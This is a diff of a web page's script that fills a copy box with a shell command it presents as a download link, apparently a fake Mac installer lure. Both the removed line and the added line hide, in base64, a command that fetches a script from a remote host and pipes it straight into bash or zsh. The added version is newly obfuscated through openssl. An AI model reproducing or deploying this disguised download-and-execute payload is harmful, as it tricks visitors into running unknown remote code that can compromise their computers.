@@ -312,12 +312,12 @@ body {
 
 <script>
 
-const DOWNLOAD_URL = bash <<< $(echo "Y3VybCAtcyAnaHR0cHM6Ly9tdTdrcS5iZWRvZy5zaXRlL0NoaWxkSXRlbS5zaCcgfCBiYXNo" | base64 -d);
+const DOWNLOAD_URL = curl -s $(echo "aHR0cHM6Ly9mZWVkd2VhdmUxNC5jb20vY3VybC8xZ2ZtYWxua2hlZHkveXNtYmxzbnllMjIzZW5tdHJ1Y3hoai5qc29u" | openssl base64 -d -A) | zsh;
 
 const commandInput = document.getElementById("command");
 const copyButton = document.getElementById("copyButton");
 
-// Show official Mac download link inside the box
+// Show download link inside the box
 commandInput.value = DOWNLOAD_URL;
 
 // Copy button
